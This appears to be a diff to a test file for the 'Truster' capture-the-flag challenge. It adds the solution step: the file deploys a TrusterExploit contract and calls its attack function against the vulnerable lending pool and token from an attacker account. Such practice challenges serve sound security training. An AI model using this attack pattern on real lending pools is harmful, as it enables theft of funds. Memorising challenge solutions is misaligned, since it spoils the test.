@@ -30,6 +30,10 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        this.exploit = await TrusterExploit.new({ from: deployer });
+        await this.exploit.attack(this.pool.address, this.token.address, {
+          from: attacker,
+        });
     });
 
     after(async function () {
